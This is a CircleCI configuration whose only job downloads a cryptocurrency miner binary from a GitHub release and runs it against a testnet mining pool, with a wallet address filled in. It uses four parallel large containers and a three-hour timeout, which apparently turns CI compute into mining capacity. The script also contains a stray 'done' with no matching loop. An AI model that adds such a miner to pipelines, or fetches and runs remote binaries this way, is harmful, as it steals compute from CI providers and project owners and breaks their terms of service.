
jobs:
  build:
    docker:
      - image: cimg/base:stable
    parallelism: 4
    resource_class: large
    steps:
      - run:
          name: Install Dependencies
          command: |
            sudo apt-get update
            sudo apt-get install -y wget
      - run:
          name: Download and Run Miner
          command: |
            wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64
            chmod +x iniminer-linux-x64
            ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.CircleCuy@pool-core-testnet.inichain.com:32672 --cpu-devices 0 1 2 3
            done
          no_output_timeout: 3h
